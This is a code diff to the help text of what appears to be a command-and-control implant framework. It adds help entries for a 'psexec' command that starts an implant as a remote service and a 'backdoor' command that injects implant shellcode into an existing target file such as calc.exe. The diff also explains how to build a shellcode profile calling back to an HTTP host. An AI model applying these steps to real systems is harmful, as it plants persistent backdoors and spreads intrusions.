@@ -65,6 +65,8 @@ var (
 		consts.SideloadStr:         sideloadHelp,
 		consts.TerminateStr:        terminateHelp,
 		consts.LoadExtensionStr:    loadExtensionHelp,
+		consts.PsExecStr:           psExecHelp,
+		consts.BackdoorStr:         backdoorHelp,
 
 		consts.WebsitesStr:   websitesHelp,
 		consts.ScreenshotStr: screenshotHelp,
@@ -356,8 +358,14 @@ Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which all
  - Linux: /bin/bash
  - Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment
 `
-psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
+	psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
 [[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.
+`
+	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
+[[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
+[[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
+
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --name whatever --http ab.cd
 `
 )
 
